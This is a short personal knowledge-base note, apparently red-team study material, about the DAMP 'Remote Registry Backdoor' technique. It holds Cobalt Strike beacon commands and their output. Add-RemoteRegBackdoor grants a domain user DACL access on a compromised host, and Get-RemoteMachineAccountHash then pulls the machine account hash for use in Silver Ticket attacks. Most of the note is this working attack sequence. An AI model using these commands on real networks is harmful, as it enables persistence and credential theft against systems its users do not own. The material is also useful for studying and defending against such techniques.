---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Remote Registry Backdoor]]  
___

## Description:  

The [DAMP](https://github.com/HarmJ0y/DAMP) project can implement host-based DACL backdoors to enable the remote retrieval of secrets from a machine, including SAM and domain cached hashes.

`Add-RemoteRegBackdoor` can be run locally on a compromised machine, or remotely with credentials.

```
beacon> run hostname
srv-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Add-RemoteRegBackdoor -Trustee DEV\bfarmer

ComputerName BackdoorTrustee
------------ ---------------
SRV-2        DEV\bfarmer

```

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\srv-2\c$
[-] could not open \\srv-2\c$\*: 5

beacon> powershell Get-RemoteMachineAccountHash -ComputerName srv-2

ComputerName MachineAccountHash              
------------ ------------------              
srv-2        5d0d485386727a8a92498a2c188627ec
```

See **Silver Tickets** for why this is useful.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:41 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
